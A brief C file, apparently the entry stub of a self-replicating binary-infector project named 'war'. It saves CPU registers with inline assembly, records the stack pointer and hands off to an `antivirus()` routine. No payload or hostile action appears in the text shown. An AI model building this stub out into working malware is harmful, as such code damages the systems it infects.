#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void __entry(void)
{
	asm volatile
	(
		"push rbp\n"
		"push 0x0\n"
		"push rbx\n"
		"push rax\n"
		"push rdi\n"
		"push rsi\n"
		"push rdx\n"
		"push rcx\n"
		"push r8\n"
		"push r9\n"
		"push r10\n"
		"push r11\n"
		"push r12\n"
		"push r13\n"
		"push r14\n"
		"push r15\n"
	);

	struct s_keychain keychain = {0};
	struct s_host host = {0};

	asm volatile
	(
		"mov %0, rsp\n"
		: "=r"(host.rsp)
		:
	);

	antivirus(&host, &keychain, SUCCESS);
}
